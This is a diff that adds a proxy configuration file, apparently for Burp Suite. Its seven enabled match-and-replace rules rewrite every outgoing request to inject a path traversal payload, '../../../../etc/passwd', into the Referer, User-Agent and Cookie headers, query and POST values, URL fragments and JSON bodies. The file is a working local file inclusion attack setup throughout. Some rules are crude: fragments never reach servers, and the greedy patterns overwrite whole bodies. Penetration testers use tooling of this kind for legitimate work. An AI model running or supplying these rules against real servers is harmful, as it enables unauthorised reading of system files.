@@ -1,0 +1,62 @@
+{
+    "proxy": {
+        "match_replace_rules": [
+            {
+                "comment": "LFI payload in Referer header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "Referer: ",
+                "string_replace": "Referer: ../../../../etc/passwd"
+            },
+            {
+                "comment": "LFI payload in User-Agent header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "User-Agent: ",
+                "string_replace": "User-Agent: ../../../../etc/passwd"
+            },
+            {
+                "comment": "LFI payload in Cookie header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "Cookie: ",
+                "string_replace": "Cookie: session=../../../../etc/passwd"
+            },
+            {
+                "comment": "LFI payload in query parameter values",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "=.*",
+                "string_replace": "=../../../../etc/passwd"
+            },
+            {
+                "comment": "LFI payload in URL fragments",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_uri",
+                "string_match": "#",
+                "string_replace": "#../../../../etc/passwd"
+            },
+            {
+                "comment": "LFI payload in JSON body",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "\".*\":.*",
+                "string_replace": "\"file\":\"../../../../etc/passwd\""
+            },
+            {
+                "comment": "LFI payload in POST parameter values",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "=.*",
+                "string_replace": "=../../../../etc/passwd"
+            }
+        ]
+    }
+}
